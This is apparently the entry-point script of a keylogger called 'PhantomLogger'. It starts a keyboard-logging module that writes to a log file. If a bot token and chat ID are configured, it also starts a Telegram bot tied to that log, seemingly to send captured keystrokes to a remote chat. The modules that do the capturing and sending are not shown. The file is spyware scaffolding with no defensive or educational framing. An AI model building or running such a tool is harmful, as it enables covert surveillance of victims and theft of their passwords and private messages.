import os
import asyncio
from dotenv import load_dotenv
from modules.logger import KeyboardLogger
from modules.telegram_bot import TelegramBot
from modules.utils import get_log_path

load_dotenv()

class PhantomLogger:
    def __init__(self):
        self.log_file = get_log_path()
        
        self.bot_token = os.getenv('BOT_TOKEN')
        self.chat_id = os.getenv('CHAT_ID')
        self.telegram_enabled = bool(self.bot_token and self.chat_id)
        
        self.keyboard_logger = KeyboardLogger(self.log_file)
        
        if self.telegram_enabled:
            self.telegram_bot = TelegramBot(
                self.bot_token,
                self.chat_id,
                self.log_file
            )
        else:
            self.telegram_bot = None
    
    async def run(self):
        log_dir = os.path.dirname(self.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
        
        self.keyboard_logger.start_non_blocking()
        
        if self.telegram_bot:
            await self.telegram_bot.start()
            try:
                while True:
                    await asyncio.sleep(1)
            except KeyboardInterrupt:
                await self.telegram_bot.stop()
                self.keyboard_logger.stop()

if __name__ == "__main__":
    logger = PhantomLogger()
    asyncio.run(logger.run())
